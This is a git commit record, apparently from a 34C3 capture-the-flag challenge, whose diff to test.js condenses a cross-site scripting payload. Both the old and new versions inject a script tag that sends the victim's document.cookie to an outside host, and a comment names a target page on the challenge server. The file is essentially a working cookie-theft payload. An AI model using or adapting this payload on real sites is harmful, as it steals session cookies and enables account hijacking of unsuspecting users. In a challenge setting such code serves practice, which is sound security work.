d11927353a0ccb9ef3248cea1040284a81c0210f
Jean-Sebastien Baklouti <jeansebastien.baklouti@gmail.com>
2017-12-29 19:58:13 +0100

    challendge 34c3

--- test.js
+++ test.js
@@ -1,5 +1,3 @@
 //http://35.198.120.230/messages/new/e836558151127b85d1bf286a10c14a06
-var test = document.cookie
-var my_awesome_script = document.createElement('script');
-	my_awesome_script.setAttribute('src','http://toussa.beneth.fr/?cookie='+test);
-document.head.appendChild(my_awesome_script);
+r=document.createElement('script');r.setAttribute('src','http://toussa.beneth.fr/?cookie='+document.cookie);
+document.head.appendChild(r)
